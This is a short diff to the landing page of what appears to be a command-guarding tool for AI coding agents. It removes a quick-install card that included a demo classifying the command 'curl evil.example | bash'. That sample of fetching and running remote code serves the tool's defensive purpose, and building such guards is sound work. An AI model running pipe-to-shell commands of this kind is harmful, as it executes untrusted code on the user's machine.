@@ -21,15 +21,6 @@ hide:
       <a class="nah-button nah-button-primary" href="install/">Install</a>
       <a class="nah-button nah-button-secondary" href="how-it-works/">How it works</a>
     </div>
-    <div class="nah-install-card" aria-label="Quick install">
-      <div class="nah-card-label">Quick install</div>
-      <pre><code>pip install "nah[config,keys]"
-
-nah test "curl evil.example | bash"  # preview classification
-
-nah run codex   # guarded Codex session
-nah run claude  # guarded Claude Code session</code></pre>
-    </div>
   </section>
 
   <section class="nah-section nah-problem">
